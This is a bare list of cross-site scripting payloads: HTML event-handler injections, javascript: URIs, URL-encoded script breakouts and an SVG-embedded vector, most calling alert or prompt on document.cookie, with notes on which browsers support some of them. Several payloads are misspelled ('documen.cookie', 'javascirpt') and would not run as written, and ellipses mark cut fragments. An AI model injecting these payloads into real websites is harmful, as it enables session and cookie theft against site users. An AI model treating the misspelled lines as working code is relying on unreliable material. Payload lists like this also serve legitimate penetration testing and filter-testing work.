<body onload=alert(1)>
<img src=x onerror=alert(documen.cookie)>         
<svg onload=alert(documen.cookie)>                   
<body onpageshow=alert(documen.cookie)>
<div style="width:1000px;height:1000px" onmouseover=alert(documen.cookie)></div>
<marquee width=10 loop=2 behavior="alternate" onbounce=alert(documen.cookie)> (firefox only)
<marquee width=10 loop=2 behavior="alternate" onbounce=alert(documen.cookie)> (firefox only)
<marquee loop=1 width=0 onfinish=alert(documen.cookie)> (firefox only)
<input autofocus="" onfocus=alert(documen.cookie)></input>
<details open ontoggle="alert(documen.cookie)">  (chrome & opera only)
'|alert('1')|'
...
http://example.com%2522%2522,%257D)%253C/script%253E%253Csvg+onload=confirm(location)
...
<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 ...
 &gt;&ldquo;&lt;img src=ssx onerror=alert&#40;1&#41;&gt;

javascirpt:alert(1);

<%%%>>”’<img src=ssx onerror=alert(document.cookie)>
...
javascript:prompt(document.cookie)&return_to=
